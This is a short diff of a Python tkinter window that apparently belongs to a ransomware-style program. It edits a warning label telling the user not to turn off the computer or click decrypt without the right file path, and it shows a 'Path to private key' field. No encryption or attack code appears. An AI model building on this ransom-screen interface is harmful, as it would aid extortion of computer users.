@@ -85,7 +85,7 @@ if __name__ == "__main__":
 	imLabel = tk.Label(frame, image = bgImg)
 	imLabel.place(relx = 0, rely = 0, relwidth = 1, relheight = 1)
 	
-	warnLabel = tk.Label(frame, text = "Do not turn off your computer or click decrypt without right file path else data will be lost.. Read below for more info", bg = "#f75a3e", fg = "#fcf6de", font = ("Helvetica 15"))
+	warnLabel = tk.Label(frame, text = "Do not turn off your computer or click decrypt without right file path...", bg = "#f75a3e", fg = "#fcf6de", font = ("Helvetica 15"))
 	warnLabel.place(relx = 0.06, rely = 0.01, relwidth = 0.88, relheight = 0.1)
 	
 	keyLabel = tk.Label(frame, text = "Path to private key :", bg = "#9c75ff", fg = "#ffffff", relief = "solid", anchor = "w", padx = 10, font = ("Helvetica 13"))
